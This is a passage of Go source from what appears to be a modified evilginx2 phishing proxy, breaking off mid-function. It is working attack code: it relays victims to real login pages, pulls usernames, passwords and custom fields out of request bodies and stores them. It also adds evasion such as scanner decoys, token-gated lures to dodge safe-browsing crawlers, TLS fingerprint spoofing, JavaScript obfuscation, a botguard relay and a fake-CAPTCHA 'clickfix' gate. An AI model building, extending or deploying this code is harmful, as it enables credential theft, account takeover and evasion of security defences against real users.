/*

This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!

*/

package core

import (
	"bytes"
	"crypto/subtle"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/elazarl/goproxy"
	"github.com/fatih/color"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const (
	CONVERT_TO_ORIGINAL_URLS = 0
	CONVERT_TO_PHISHING_URLS = 1
)

const (
	HOME_DIR = ".evilginx"
)

const (
	httpReadTimeout  = 45 * time.Second
	httpWriteTimeout = 45 * time.Second
)

// original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)

type HttpProxy struct {
	Server            *http.Server
	Proxy             *goproxy.ProxyHttpServer
	crt_db            *CertDb
	cfg               *Config
	db                *database.Database
	bl                *Blacklist
	gophish           *GoPhish
	sniListener       net.Listener
	isRunning         bool
	sessions          map[string]*Session
	sids              map[string]int
	cookieName        string
	last_sid          int
	developer         bool
	botguard          bool
	jsobf             string
	webhook_url       string
	wh_sent           map[string]bool
	wh_mtx            sync.Mutex
	bg_grace          int
	bg_no_ua          bool
	bg_grease         map[string]bool
	bg_det_cidrs      []*net.IPNet
	bg_trusted        []*net.IPNet
	bg_det_count      int64
	bg_fp             map[string]*bgFPEntry
	bg_ja4            []string
	bgStateMap        map[string]*bgSessionState
	bg_tokens         map[string]string
	upstreamDial      func(network, addr string) (net.Conn, error)
	bg_mtx            sync.Mutex
	ip_whitelist      map[string]int64
	ip_sids           map[string]string
	auto_filter_mimes []string
	ip_mtx            sync.Mutex
	session_mtx       sync.Mutex
}

type ProxySession struct {
	SessionId    string
	Created      bool
	PhishDomain  string
	PhishletName string
	Index        int
}

// set the value of the specified key in the JSON body
func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
	var data map[string]interface{}
	if err := json.Unmarshal(body, &data); err != nil {
		return nil, err
	}
	data[key] = value
	newBody, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}
	return newBody, nil
}

func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	p := &HttpProxy{
		Proxy:             goproxy.NewProxyHttpServer(),
		Server:            nil,
		crt_db:            crt_db,
		cfg:               cfg,
		db:                db,
		bl:                bl,
		gophish:           NewGoPhish(),
		isRunning:         false,
		last_sid:          0,
		developer:         developer,
		ip_whitelist:      make(map[string]int64),
		ip_sids:           make(map[string]string),
		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
	}

	p.Server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", hostname, port),
		Handler:      p.Proxy,
		ReadTimeout:  httpReadTimeout,
		WriteTimeout: httpWriteTimeout,
	}

	if cfg.proxyConfig.Enabled {
		err := p.setProxy(cfg.proxyConfig.Enabled, cfg.proxyConfig.Type, cfg.proxyConfig.Address, cfg.proxyConfig.Port, cfg.proxyConfig.Username, cfg.proxyConfig.Password)
		if err != nil {
			log.Error("proxy: %v", err)
			cfg.EnableProxy(false)
		} else {
			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
		}
	}
	// wire the upstream path even when the proxy is off — the TLS fingerprint
	// spoofing (proxyConfig.TLSFingerprint) applies to direct upstream too
	p.applyTransport()

	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
	p.botguard = false
	p.bg_grease = make(map[string]bool)
	p.bg_fp = make(map[string]*bgFPEntry)
	p.bgStateMap = make(map[string]*bgSessionState)
	p.bg_tokens = make(map[string]string)
	p.upstreamDial = (&net.Dialer{Timeout: 30 * time.Second}).Dial
	p.bg_grace = 8
	p.bg_no_ua = false
	p.wh_sent = make(map[string]bool)
	p.sessions = make(map[string]*Session)
	p.sids = make(map[string]int)

	p.Proxy.Verbose = false

	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		req.URL.Scheme = "https"
		req.URL.Host = req.Host
		p.Proxy.ServeHTTP(w, req)
	})

	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)

	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			ps := &ProxySession{
				SessionId:    "",
				Created:      false,
				PhishDomain:  "",
				PhishletName: "",
				Index:        -1,
			}
			ctx.UserData = ps
			hiblue := color.New(color.FgHiBlue)

			if p.isBotRequest(req, ps) {
				return p.decoyRequest(req)
			}

			// relay route: /__relay/* reverse-proxies to the local real-browser
			// relay service (feature: Google botguard relay, see tools/relay/).
			// Botguard still filtered scanners above; the relay sits behind the
			// node's TLS + JA4 protections.
			if strings.HasPrefix(req.URL.Path, "/__relay/") || req.URL.Path == "/__relay" {
				return p.relayRequest(req)
			}

			// handle ip blacklist
			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]

			// handle proxy headers
			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
			for _, h := range proxyHeaders {
				origin_ip := req.Header.Get(h)
				if origin_ip != "" {
					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
					break
				}
			}

			if p.cfg.GetBlacklistMode() != "off" {
				if p.bl.IsBlacklisted(from_ip) {
					if p.bl.IsVerbose() {
						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
					}
					return p.blockRequest(req)
				}
				if p.cfg.GetBlacklistMode() == "all" {
					if !p.bl.IsWhitelisted(from_ip) {
						err := p.bl.AddIP(from_ip)
						if p.bl.IsVerbose() {
							if err != nil {
								log.Error("blacklist: %s", err)
							} else {
								log.Warning("blacklisted ip address: %s", from_ip)
							}
						}
					}

					return p.blockRequest(req)
				}
			}

			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
			o_host := req.Host
			lure_url := req_url
			req_path := req.URL.Path
			if req.URL.RawQuery != "" {
				req_url += "?" + req.URL.RawQuery
				//req_path += "?" + req.URL.RawQuery
			}

			pl := p.getPhishletByPhishHost(req.Host)
			remote_addr := from_ip

			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")

			if strings.HasPrefix(req.URL.Path, "/t/") {
				if resp := p.botguardTelemetry(req); resp != nil {
					return req, resp
				}
			}

			if js_inject_re.MatchString(req.URL.Path) {
				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 3 {
					session_id := ra[1]
					js_id := ra[2]
					if strings.HasSuffix(js_id, ".js") {
						js_id = js_id[:len(js_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							var js_params *map[string]string = nil
							js_params = &s.Params

							script, err := pl.GetScriptInjectById(js_id, js_params)
							if err == nil {
								script = ObfuscateJS(script, p.jsobf)
								d_body += script + "\n\n"
							} else {
								log.Warning("js_inject: script not found: '%s'", js_id)
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js_inject: session not found: '%s'", session_id)
						}
					}
				}
			} else if redir_re.MatchString(req.URL.Path) {
				ra := redir_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 2 {
					session_id := ra[1]
					if strings.HasSuffix(session_id, ".js") {
						// respond with injected javascript
						session_id = session_id[:len(session_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							if !s.IsDone {
								if s.RedirectURL != "" {
									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
									d_body += dynamic_redirect_js + "\n\n"
								}
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js: session not found: '%s'", session_id)
						}
					} else {
						if _, ok := p.sessions[session_id]; ok {
							redirect_url, ok := p.waitForRedirectUrl(session_id)
							if ok {
								type ResponseRedirectUrl struct {
									RedirectUrl string `json:"redirect_url"`
								}
								d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
								if err == nil {
									s_index, _ := p.sids[session_id]
									log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
									resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
									return req, resp
								}
							}
							resp := goproxy.NewResponse(req, "application/json", 408, "")
							return req, resp
						} else {
							log.Warning("api: session not found: '%s'", session_id)
						}
					}
				}
			}

			phishDomain, phished := p.getPhishDomain(req.Host)
			if phished {
				pl_name := ""
				if pl != nil {
					pl_name = pl.Name
					ps.PhishletName = pl_name
				}
				session_cookie := getSessionCookieName(pl_name, p.cookieName)

				ps.PhishDomain = phishDomain
				req_ok := false
				// handle session
				if p.handleSession(req.Host) && pl != nil {
					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
					if err == nil {
						log.Debug("triggered lure for path '%s'", req_path)
					}

					var create_session bool = true
					var ok bool = false
					sc, err := req.Cookie(session_cookie)
					if err == nil {
						ps.Index, ok = p.sids[sc.Value]
						if ok {
							create_session = false
							ps.SessionId = sc.Value
							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
						} else {
							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					} else {
						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
							// not a lure path and IP is whitelisted

							// TODO: allow only retrieval of static content, without setting session ID

							create_session = false
							req_ok = true
							/*
								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
								if ok {
									create_session = false
									ps.Index, ok = p.sids[ps.SessionId]
								} else {
									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
								}*/
						}
					}

					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO: always trigger new session when lure URL is detected (do not check for whitelisted IP only after this is done)
						// session cookie not found
						if !p.cfg.IsSiteHidden(pl_name) {
							if l != nil {
								// clickfix-only mode: serve the fake-captcha gate
								// INSTEAD of creating a session — no login flow at all
								if cf := pl.ClickFix(); cf != nil && cf.Only {
									log.Info("[%s] clickfix-only: serving gate [%s]", pl_name, remote_addr)
									return p.serveClickFixBefore(req, cf, l.RedirectUrl, &map[string]string{})
								}

								// check if lure is not paused
								if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
									log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
									return p.blockRequest(req)
								}

								// check if lure user-agent filter is triggered
								if len(l.UserAgentFilter) > 0 {
									re, err := regexp.Compile(l.UserAgentFilter)
									if err == nil {
										if !re.MatchString(req.UserAgent()) {
											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

											if p.cfg.GetBlacklistMode() == "unauth" {
												if !p.bl.IsWhitelisted(from_ip) {
													err := p.bl.AddIP(from_ip)
													if p.bl.IsVerbose() {
														if err != nil {
															log.Error("blacklist: %s", err)
														} else {
															log.Warning("blacklisted ip address: %s", from_ip)
														}
													}
												}
											}
											return p.blockRequest(req)
										}
									} else {
										log.Error("lures: user-agent filter regexp is invalid: %v", err)
									}
								}

								// lure token-gate: bare lure URLs (crawlers, safe-browsing,
								// link previews) never reach the login flow — they are
								// redirected to the benign redirect_url instead. Victims
								// receive the campaign link with ?t=<token> attached.
								if l.Token != "" {
									qt := req.URL.Query().Get("t")
									okTok := qt != "" &&
										subtle.ConstantTimeCompare([]byte(qt), []byte(l.Token)) == 1
									if !okTok {
										log.Warning("[%s] lure token-gated: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
										if l.RedirectUrl != "" {
											return p.blockRedirect(req, l.RedirectUrl)
										}
										return p.blockRequest(req)
									}
								}

								// relay lure: serve the real-browser relay page instead
								// of creating a MITM session (botguard-safe Google flow)
								if l.Relay {
									log.Important("[%s] relay lure hit: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
									return p.relayPage(req, pl_name)
								}

								session, err := NewSession(pl.Name)
								if err == nil {
									// set params from url arguments
									p.extractParams(session, req.URL)

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										if trackParam, ok := session.Params["o"]; ok {
											if trackParam == "track" {
												// gophish email tracker image
												rid, ok := session.Params["rid"]
												if ok && rid != "" {
													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
													err = p.gophish.ReportEmailOpened(rid, remote_addr, req.Header.Get("User-Agent"))
													if err != nil {
														log.Error("gophish: %s", err)
													}
													return p.trackerImage(req)
												}
											}
										}
									}

									sid := p.last_sid
									p.last_sid += 1
									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
									p.sessions[session.Id] = session
									p.sids[session.Id] = sid

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										rid, ok := session.Params["rid"]
										if ok && rid != "" {
											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
											err = p.gophish.ReportEmailLinkClicked(rid, remote_addr, req.Header.Get("User-Agent"))
											if err != nil {
												log.Error("gophish: %s", err)
											}
										}
									}

									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
										log.Error("database: %v", err)
									}

									session.RemoteAddr = remote_addr
									session.UserAgent = req.Header.Get("User-Agent")
									session.RedirectURL = pl.RedirectUrl
									if l.RedirectUrl != "" {
										session.RedirectURL = l.RedirectUrl
									}
									if session.RedirectURL != "" {
										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
									}
									session.PhishLure = l
									log.Debug("redirect URL (lure): %s", session.RedirectURL)

									ps.SessionId = session.Id
									ps.Created = true
									ps.Index = sid
									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)

									req_ok = true
								}
							} else {
								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

								if p.cfg.GetBlacklistMode() == "unauth" {
									if !p.bl.IsWhitelisted(from_ip) {
										err := p.bl.AddIP(from_ip)
										if p.bl.IsVerbose() {
											if err != nil {
												log.Error("blacklist: %s", err)
											} else {
												log.Warning("blacklisted ip address: %s", from_ip)
											}
										}
									}
								}
								return p.blockRequest(req)
							}
						} else {
							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					}
				}

				// redirect for unauthorized requests
				if ps.SessionId == "" && p.handleSession(req.Host) {
					if !req_ok {
						return p.blockRequest(req)
					}
				}
				req.Header.Set(p.getHomeDir(), o_host)

					if ps.SessionId != "" {
						if s, ok := p.sessions[ps.SessionId]; ok {
							l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
							if err == nil {
							// clickfix pre-auth gate: serve the fake-captcha page
							// at the lure path before the login flow starts
							if cf := pl.ClickFix(); cf != nil && !p.isForwarderUrl(req.URL) {
								if cf.Only || cf.Position == "before" {
									if s.RedirectCount == 0 {
										s.RedirectCount += 1
										lure_url := req_url
										if cf.Only {
											// clickfix-only: redirect to the lure's
											// benign target after verify, skip login
											lure_url = l.RedirectUrl
											if lure_url == "" {
												lure_url = pl.RedirectUrl
											}
										}
										if req2, resp := p.serveClickFixBefore(req, cf, lure_url, &s.Params); resp != nil {
											return req2, resp
										}
									}
								}
							}
								// show html redirector if it is set for the current lure
								if l.Redirector != "" {
								if !p.isForwarderUrl(req.URL) {
									if s.RedirectorName == "" {
										s.RedirectorName = l.Redirector
										s.LureDirPath = req_path
									}

									t_dir := l.Redirector
									if !filepath.IsAbs(t_dir) {
										redirectors_dir := p.cfg.GetRedirectorsDir()
										t_dir = filepath.Join(redirectors_dir, t_dir)
									}

									index_path1 := filepath.Join(t_dir, "index.html")
									index_path2 := filepath.Join(t_dir, "index.htm")
									index_found := ""
									if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
										index_found = index_path1
									} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
										index_found = index_path2
									}

									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
										html, err := ioutil.ReadFile(index_found)
										if err == nil {

											html = p.injectOgHeaders(l, html)

											body := string(html)
											body = p.replaceHtmlParams(body, lure_url, &s.Params)

											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
											if resp != nil {
												return req, resp
											} else {
												log.Error("lure: failed to create html redirector response")
											}
										} else {
											log.Error("lure: failed to read redirector file: %s", err)
										}

									} else {
										log.Error("lure: redirector file does not exist: %s", index_found)
									}
								}
							}
						} else if s.RedirectorName != "" {
							// session has already triggered a lure redirector - see if there are any files requested by the redirector

							rel_parts := []string{}
							req_path_parts := strings.Split(req_path, "/")
							lure_path_parts := strings.Split(s.LureDirPath, "/")

							for n, dname := range req_path_parts {
								if len(dname) > 0 {
									path_add := true
									if n < len(lure_path_parts) {
										//log.Debug("[%d] %s <=> %s", n, lure_path_parts[n], req_path_parts[n])
										if req_path_parts[n] == lure_path_parts[n] {
											path_add = false
										}
									}
									if path_add {
										rel_parts = append(rel_parts, req_path_parts[n])
									}
								}

							}
							rel_path := filepath.Join(rel_parts...)
							//log.Debug("rel_path: %s", rel_path)

							t_dir := s.RedirectorName
							if !filepath.IsAbs(t_dir) {
								redirectors_dir := p.cfg.GetRedirectorsDir()
								t_dir = filepath.Join(redirectors_dir, t_dir)
							}

							path := filepath.Join(t_dir, rel_path)

							// ensure we do not walk out of the redirectors directory
							abs, err1 := filepath.Abs(path)
							base, err2 := filepath.Abs(t_dir)
							if err1 != nil || err2 != nil ||
								(abs != base && !strings.HasPrefix(abs, base+string(os.PathSeparator))) {
								log.Warning("lure: redirector path escapes redirectors dir, refusing: %s", req_path)
								return p.blockRequest(req)
							}

							if _, err := os.Stat(path); !os.IsNotExist(err) {
								fdata, err := ioutil.ReadFile(path)
								if err == nil {
									//log.Debug("ext: %s", filepath.Ext(req_path))
									mime_type := getContentType(req_path, fdata)
									//log.Debug("mime_type: %s", mime_type)
									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
									if resp != nil {
										resp.Body = io.NopCloser(bytes.NewReader(fdata))
										return req, resp
									} else {
										log.Error("lure: failed to create redirector data file response")
									}
								} else {
									log.Error("lure: failed to read redirector data file: %s", err)
								}
							} else {
								//log.Warning("lure: template file does not exist: %s", path)
							}
						}
					}
				}

				// redirect to login page if triggered lure path
				if pl != nil {
					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
					if err == nil {
						// redirect from lure path to login url
						rurl := pl.rewriteUrlOut(pl.GetLoginUrl())
						u, err := url.Parse(rurl)
						if err == nil {
							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
								if resp != nil {
									resp.Header.Add("Location", rurl)
									return req, resp
								}
							}
						}
					}
				}

				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
				if p.cfg.IsLureHostnameValid(req.Host) {
					log.Debug("lure hostname detected - returning 404 for request: %s", req_url)

					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
					if resp != nil {
						return req, resp
					}
				}

				// rewrite_urls: map victim-facing path+query to real origin path+query
				if pl != nil {
					ru, np := pl.rewritePathInEx(req.URL.Path)
					if np != req.URL.Path {
						log.Debug("rewrite_urls: %s -> %s", req.URL.Path, np)
						req.URL.Path = np
					}
					if ru != nil {
						if nq := ru.RewriteQueryIn(req.URL.RawQuery); nq != req.URL.RawQuery {
							log.Debug("rewrite_urls query: %s -> %s", req.URL.RawQuery, nq)
							req.URL.RawQuery = nq
						}
					}
				}

				// replace "Host" header
				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
					req.Host = r_host
				}

				// fix origin
				origin := req.Header.Get("Origin")
				if origin != "" {
					if o_url, err := url.Parse(origin); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Origin", o_url.String())
						}
					}
				}

				// prevent caching
				req.Header.Set("Cache-Control", "no-cache")

				// fix sec-fetch-dest
				sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
				if sec_fetch_dest != "" {
					if sec_fetch_dest == "iframe" {
						req.Header.Set("Sec-Fetch-Dest", "document")
					}
				}

				// fix referer
				referer := req.Header.Get("Referer")
				if referer != "" {
					if o_url, err := url.Parse(referer); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Referer", o_url.String())
						}
					}
				}

				// patch GET query params with original domains
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
							}
						}
						req.URL.RawQuery = qs.Encode()
					}
				}

				// check for creds in request body
				if pl != nil && ps.SessionId != "" {
					req.Header.Set(p.getHomeDir(), o_host)
					body, err := ioutil.ReadAll(req.Body)
					if err == nil {
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))

						// patch phishing URLs in JSON body with original domains
						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
						req.ContentLength = int64(len(body))

						log.Debug("POST: %s", req.URL.Path)
						log.Debug("POST body = %s", body)

						contentType := req.Header.Get("Content-type")

						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")

						if json_re.MatchString(contentType) {

							if pl.username.tp == "json" {
								um := pl.username.search.FindStringSubmatch(string(body))
								if um != nil && len(um) > 1 {
									p.setSessionUsername(ps.SessionId, um[1])
									log.Success("[%d] Username: [%s]", ps.Index, um[1])
									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							if pl.password.tp == "json" {
								pm := pl.password.search.FindStringSubmatch(string(body))
								if pm != nil && len(pm) > 1 {
									p.setSessionPassword(ps.SessionId, pm[1])
									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							for _, cp := range pl.custom {
								if cp.tp == "json" {
									cm := cp.search.FindStringSubmatch(string(body))
									if cm != nil && len(cm) > 1 {
										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
											log.Error("database: %v", err)
										}
									}
								}
							}

							// force post json
							for _, fp := range pl.forcePost {
								if fp.path.MatchString(req.URL.Path) {
									log.Debug("force_post: url matched: %s", req.URL.Path)
									ok_search := false
									if len(fp.search) > 0 {
										k_matched := len(fp.search)
										for _, fp_s := range fp.search {
											matches := fp_s.key.FindAllString(string(body), -1)
											for _, match := range matches {
												if fp_s.search.MatchString(match) {
													if k_matched > 0 {
														k_matched -= 1
													}
													log.Debug("force_post: [%d] matched - %s", k_matched, match)
													break
												}
											}
										}
										if k_matched == 0 {
											ok_search = true
										}
									} else {
										ok_search = true
									}
									if ok_search {
										for _, fp_f := range fp.force {
											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
											if err != nil {
												log.Debug("force_post: got error: %s", err)
											}
											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
										}
									}
									req.ContentLength = int64(len(body))
									log.Debug("force_post: body: %s len:%d", body, len(body))
								}
							}

						} else if form_re.MatchString(contentType) {

							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
								log.Debug("POST: %s", req.URL.Path)

								for k, v := range req.PostForm {
									// patch phishing URLs in POST params with original domains

									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
										um := pl.username.search.FindStringSubmatch(v[0])
										if um != nil && len(um) > 1 {
											p.setSessionUsername(ps.SessionId, um[1])
											log.Success("[%d] Username: [%s]", ps.Index, um[1])
											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
										pm := pl.password.search.FindStringSubmatch(v[0])
										if pm != nil && len(pm) > 1 {
											p.setSessionPassword(ps.SessionId, pm[1])
											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									for _, cp := range pl.custom {
										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
											cm := cp.search.FindStringSubmatch(v[0])
											if cm != nil && len(cm) > 1 {
												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
